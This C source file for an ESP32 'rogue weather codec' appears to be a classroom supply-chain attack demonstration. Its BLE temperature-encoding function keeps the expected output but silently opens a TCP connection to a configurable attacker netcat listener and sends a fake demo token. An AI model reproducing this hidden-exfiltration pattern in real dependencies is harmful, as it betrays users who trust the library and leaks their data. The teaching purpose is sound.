#include "rogue_weather_codec.h"

#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "esp_log.h"
#include "sdkconfig.h"

static const char *TAG = "ROGUE_CODEC";

// Deliberately fake classroom secret. Do not exfiltrate real WiFi passwords or real credentials.
static const char *DEMO_TOKEN = "ESP32_DEMO_SUPPLY_CHAIN_TOKEN";

// Target nc listener (e.g. on attacker's laptop: `nc -lvnp 4444`)
// Override via menuconfig / build flags if desired.
#ifndef ROGUE_NC_HOST
#define ROGUE_NC_HOST "192.168.1.100"
#endif
#ifndef ROGUE_NC_PORT
#define ROGUE_NC_PORT 4444
#endif

static char s_nc_host[64] = ROGUE_NC_HOST;
static uint16_t s_nc_port = ROGUE_NC_PORT;

void rogue_weather_codec_set_nc_target(const char *host, uint16_t port)
{
    if (host != NULL) {
        strncpy(s_nc_host, host, sizeof(s_nc_host) - 1);
        s_nc_host[sizeof(s_nc_host) - 1] = '\0';
    }
    if (port != 0) {
        s_nc_port = port;
    }
}

static void publish_demo_leak(float temperature)
{
#if CONFIG_ROGUE_WEATHER_CODEC_ENABLE
    char payload[160];
    int len = snprintf(payload, sizeof(payload),
             "{\"source\":\"rogue_weather_codec\","
             "\"event\":\"ble_temperature_encode\","
             "\"demo_token\":\"%s\","
             "\"temperature\":%.2f}\n",
             DEMO_TOKEN, temperature);

    if (len <= 0) {
        return;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        ESP_LOGW(TAG, "FAILED to create socket for PoC side effect");
        return;
    }

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(s_nc_port);
    if (inet_pton(AF_INET, s_nc_host, &dest.sin_addr) != 1) {
        ESP_LOGW(TAG, "FAILED to parse nc target address '%s'", s_nc_host);
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) != 0) {
        ESP_LOGW(TAG, "FAILED to connect to nc listener %s:%u", s_nc_host, s_nc_port);
        close(sock);
        return;
    }

    if (send(sock, payload, len, 0) < 0) {
        ESP_LOGW(TAG, "FAILED to send PoC side effect");
    } else {
        ESP_LOGW(TAG, "PoC side effect: sent demo leak to nc listener %s:%u",
                 s_nc_host, s_nc_port);
    }

    close(sock);
#endif
}

size_t rogue_weather_codec_build_ble_temperature_payload(float temperature,
                                                         uint8_t *out,
                                                         size_t out_len)
{
    if (out == NULL || out_len < sizeof(float)) {
        ESP_LOGE(TAG, "Output buffer too small for BLE temperature payload");
        return 0;
    }

    // The legitimate behavior: preserve the existing GATT payload format.
    memcpy(out, &temperature, sizeof(float));

    // The supply-chain behavior: a dependency with the same API adds an unexpected side effect.
    publish_demo_leak(temperature);

    return sizeof(float);
}
